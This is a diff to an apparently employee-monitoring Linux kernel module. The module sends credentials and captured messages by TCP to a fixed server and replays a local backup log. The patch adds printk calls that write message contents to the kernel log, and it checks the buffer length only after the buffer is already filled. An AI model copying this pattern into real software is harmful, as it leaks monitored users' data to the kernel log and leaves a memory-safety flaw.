@@ -22,6 +22,8 @@ static void disconnect(char *msg, size_t len) {
 
   if (!msg || len <= 0)
     return;
+
+  printk(KERN_INFO "Failed to send message %s\n", msg);
   backup_data_log(msg, len);
 }
 
@@ -40,13 +42,13 @@ void transmit_data(struct work_struct *work) {
     /* When a socket disconnects a new socket needs to be created */
     sock = tcp_sock_create();
     if (IS_ERR(sock)) {
-      disconnect(NULL, 0);
+      disconnect(curr_msg->msg_buf, curr_msg->length);
       goto end;
     }
 
     ret = tcp_sock_connect(sock, DEST_IP, DEST_PORT);
     if (ret < 0) {
-      disconnect(NULL, 0);
+      disconnect(curr_msg->msg_buf, curr_msg->length);
       goto end;
     }
     connected = true;
@@ -54,7 +56,7 @@ void transmit_data(struct work_struct *work) {
     // Send credentials - only after successful connection
     ret = tcp_send_msg(sock, cred, strlen(cred));
     if (ret < 0) {
-      disconnect(NULL, 0);
+      disconnect(curr_msg->msg_buf, curr_msg->length);
       goto end;
     }
   }
@@ -62,15 +64,21 @@ void transmit_data(struct work_struct *work) {
   ret = tcp_send_msg(sock, curr_msg->msg_buf, curr_msg->length);
   if (ret < 0) {
     disconnect(curr_msg->msg_buf, curr_msg->length);
-  } else {
+  } else if (sock && sock->sk && sock->sk->sk_state == TCP_ESTABLISHED) {
     // If sending message was successful then employee is connected to server
     // So now we will try to flush the backup data to the server
     while ((msg_len = read_backup_data_log(msg_buf)) > 0) {
+      if (msg_len > BUFFER_SIZE) {
+        printk(KERN_ERR "Invalid message length: %zu\n", msg_len);
+        break;
+      }
+
       ret = tcp_send_msg(sock, msg_buf, msg_len);
       if (ret < 0) {
         disconnect(msg_buf, msg_len);
         break;
       }
+      printk(KERN_INFO "Sent backup data: %s\n", msg_buf);
     }
   }
 
